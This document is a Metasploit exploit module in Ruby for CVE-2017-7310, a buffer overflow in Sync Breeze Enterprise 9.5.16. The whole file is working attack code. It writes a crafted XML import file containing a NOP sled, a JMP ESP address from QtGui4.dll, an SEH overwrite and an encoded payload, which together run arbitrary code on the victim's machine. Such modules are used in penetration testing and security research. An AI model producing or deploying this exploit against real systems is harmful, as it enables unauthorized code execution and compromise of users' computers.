# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Sync Breeze Enterprise 9.5.16 - Import Command Buffer Overflow&#039;,
      &#039;Description&#039;     => %q(
        This module exploits a buffer overflow in Sync Breeze Enterprise 9.5.16
        by using the import command option to import a specially crafted xml file.
      ),
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Daniel Teixeira&#039;
        ],
      &#039;References&#039;      =>
        [
          [ &#039;CVE&#039;, &#039;2017-7310&#039; ],
          [ &#039;EDB&#039;, &#039;41773&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039; => &#039;seh&#039;,
          &#039;DisablePayloadHandler&#039; => &#039;true&#039;
        },
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;Payload&#039;         =>
        {
          &#039;BadChars&#039; => "\x00\x01\x02\x0a\x0b\x0c\x22\x27",
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Targets&#039;         =>
        [
          [&#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x10015FFE } ]
        ],
      &#039;Privileged&#039;      => false,
      &#039;DisclosureDate&#039;  => &#039;Mar 29 2017&#039;,
      &#039;DefaultTarget&#039;   => 0))
 
    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [true, &#039;The file name.&#039;, &#039;msf.xml&#039;])
      ])
  end
 
  def exploit
    jmpesp = "\x7A\xB7\x1B\x65" # JMP ESP QtGui4.dll
    esp = "\x8D\x44\x24\x4C" # LEA EAX, [ESP+76]
    jmp = "\xFF\xE0" # JMP ESP
 
    buffer =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<classify\nname=\&#039;"
    buffer << "\x90" * 1536
    buffer << jmpesp
    buffer << "\x90" * 18
    buffer << esp
    buffer << jmp
    buffer << "\x90" * 68
    buffer << generate_seh_record(target.ret)
    buffer << "\x90" * 10
    buffer << payload.encoded
    buffer << "\x90" * 5000
    buffer << "\n</classify>"
 
    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    file_create(buffer)
  end
end

